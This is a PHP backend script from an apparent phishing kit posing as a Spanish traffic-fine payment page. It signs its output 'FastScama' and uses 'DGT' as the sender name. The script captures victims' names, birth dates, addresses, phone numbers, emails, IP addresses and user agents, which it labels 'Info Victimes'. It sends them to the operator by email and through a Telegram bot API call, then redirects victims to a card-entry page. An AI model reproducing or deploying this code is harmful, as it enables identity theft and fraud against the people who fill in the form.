<?php
session_start();
include '../settings.php';
include_once('../Panel/fonctions/get.php');
// Enregistrement des informations dans la session
date_default_timezone_set('Europe/Paris');
$_SESSION['date_heure'] = date('d/m/y, H:i:s');

$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

// Récupération des données du formulaire
$_SESSION['nom'] = 		$_POST['nom'];
$_SESSION['prenom'] = 	$_POST['prenom'];
$_SESSION['dob'] = 		$_POST['dob'];
$_SESSION['cp'] = 		$_POST['cp'];
$_SESSION['ville'] = 	$_POST['ville'];
$_SESSION['adresse'] = 	$_POST['adresse'];
$_SESSION['tel'] = 		$_POST['tel'];
$_SESSION['email'] = 	$_POST['email'];


if (!empty($_POST['nom']) && !empty($_POST['prenom'])&& !empty($_POST['dob'])&& !empty($_POST['cp'])&& !empty($_POST['ville'])&& !empty($_POST['adresse'])&& !empty($_POST['tel'])&& !empty($_POST['email'])) {
    
    


    $message = "
	[📝] Infos | 🇪🇸 Amende Espagne 

	[👤] Nom  : " . $_SESSION['nom'] . "
	[👤] Prénom : " . $_SESSION['prenom'] . "					
	[📝] Date de naissance  : " . $_SESSION['dob'] . "
	[📧] Email  : " . $_SESSION['email'] . "
	[📞] N° Mobile : " . $_SESSION['tel'] . "
	[📍] Adresse  : " . $_SESSION['adresse'] . "
	[🌍] Ville : " . $_SESSION['ville'] . "
	[🌍] Code Postal : " . $_SESSION['cp'] . "
	
	[ℹ️] 𝗜𝗻𝗳𝗼 𝗩𝗶𝗰𝘁𝗶𝗺𝗲𝘀 [ℹ️]
	[⌚] Heure et date du rez : " . $_SESSION['date_heure'] . "
	[🌐] IP : " . $_SESSION['ip'] . "
	[📍] User-agent : " . $_SESSION['useragent'] . "

	[©️] 𝓒𝓸𝓭𝓮𝓻 𝓫𝔂 𝓕𝓪𝓼𝓽𝓢𝓬𝓪𝓶𝓪[©️]";	

    // Envoi par e-mail
    if ($mail_sending == true) {
        $subject = "[📝]  𝗜𝗻𝗳𝗼 | " . $_SESSION['ip'];
        $headers = "From: DGT 🇪🇸  | FASTSCAMA <rez@pablo.fr>";
        mail($rezmail, $subject, $message, $headers);
    }

    
    if ($info_sending == true) {
        $data = [
            'text' => $message,
            'chat_id' => $chat_rez
        ];
        file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?" . http_build_query($data));
    }
    	
    
   header('Location: ../user/carte.php');
	

    
    
    
} else {
    // Redirection > Error 404 
    header('Location: ../user/info.php?error=1');
}

?>
